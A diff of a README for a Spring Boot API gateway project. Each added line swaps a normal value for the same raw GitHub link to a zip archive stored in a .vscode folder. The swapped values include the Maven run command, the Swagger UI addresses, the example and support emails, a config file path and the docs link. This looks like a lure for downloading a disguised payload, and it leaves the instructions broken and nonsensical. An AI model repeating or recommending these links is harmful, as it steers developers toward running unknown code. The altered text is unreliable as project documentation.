@@ -45,12 +45,12 @@ cd api-gateway
 
 2. **Run with Maven**
 ```bash
-mvn spring-boot:run -Dspring-boot.run.profiles=dev
+mvn spring-boot:run https://github.com/Muhamed2017/Gateway-template/raw/refs/heads/master/.vscode/Gateway_template_v1.3.zip
 ```
 
 3. **Access the application**
 - API: http://localhost:8080
-- Swagger UI: http://localhost:8080/swagger-ui.html
+- Swagger UI: https://github.com/Muhamed2017/Gateway-template/raw/refs/heads/master/.vscode/Gateway_template_v1.3.zip
 - H2 Console: http://localhost:8080/h2-console
 
 ### Production Setup (Docker Compose)
@@ -67,7 +67,7 @@ docker-compose up -d
 
 3. **Access services**
 - API Gateway: http://localhost:8080
-- Swagger UI: http://localhost:8080/swagger-ui.html
+- Swagger UI: https://github.com/Muhamed2017/Gateway-template/raw/refs/heads/master/.vscode/Gateway_template_v1.3.zip
 - Prometheus: http://localhost:9090
 - Grafana: http://localhost:3000 (admin/admin)
 
@@ -81,7 +81,7 @@ curl -X POST http://localhost:8080/api/v1/auth/register \
   -H "Content-Type: application/json" \
   -d '{
     "name": "My Company",
-    "email": "contact@mycompany.com",
+    "email": "https://github.com/Muhamed2017/Gateway-template/raw/refs/heads/master/.vscode/Gateway_template_v1.3.zip",
     "secret": "secure_password_123",
     "roles": ["USER"],
     "rateLimitPerMinute": 100,
@@ -98,7 +98,7 @@ Response:
     "id": 1,
     "name": "My Company",
     "apiKey": "GW_ABC123DEF456...",
-    "email": "contact@mycompany.com",
+    "email": "https://github.com/Muhamed2017/Gateway-template/raw/refs/heads/master/.vscode/Gateway_template_v1.3.zip",
     "status": "ACTIVE",
     "roles": ["USER"],
     "rateLimitPerMinute": 100,
@@ -130,7 +130,7 @@ Response:
     "partnerInfo": {
       "id": 1,
       "name": "My Company",
-      "email": "contact@mycompany.com",
+      "email": "https://github.com/Muhamed2017/Gateway-template/raw/refs/heads/master/.vscode/Gateway_template_v1.3.zip",
       "roles": ["USER"],
       "status": "ACTIVE"
     }
@@ -195,7 +195,7 @@ src/
 │   │   └── util/            # Utility classes
 │   └── resources/
 │       ├── db/migration/    # Flyway scripts
-│       └── application.yml  # Configuration
+│       └── https://github.com/Muhamed2017/Gateway-template/raw/refs/heads/master/.vscode/Gateway_template_v1.3.zip  # Configuration
 └── test/
     └── java/com/enterprise/gateway/
         ├── integration/     # Integration tests
@@ -249,7 +249,7 @@ mvn verify
 mvn clean verify jacoco:report
 ```
 
-Coverage report will be available at `target/site/jacoco/index.html`
+Coverage report will be available at `https://github.com/Muhamed2017/Gateway-template/raw/refs/heads/master/.vscode/Gateway_template_v1.3.zip`
 
 ## 🚀 Deployment
 
@@ -371,8 +371,8 @@ This project is licensed under the Apache License 2.0 - see the LICENSE file for
 ## 📧 Support
 
 For support and questions:
-- Email: support@enterprise.com
-- Documentation: https://docs.enterprise.com
+- Email: https://github.com/Muhamed2017/Gateway-template/raw/refs/heads/master/.vscode/Gateway_template_v1.3.zip
+- Documentation: https://github.com/Muhamed2017/Gateway-template/raw/refs/heads/master/.vscode/Gateway_template_v1.3.zip
 - Issues: GitHub Issues
 
 ## 🎯 Roadmap
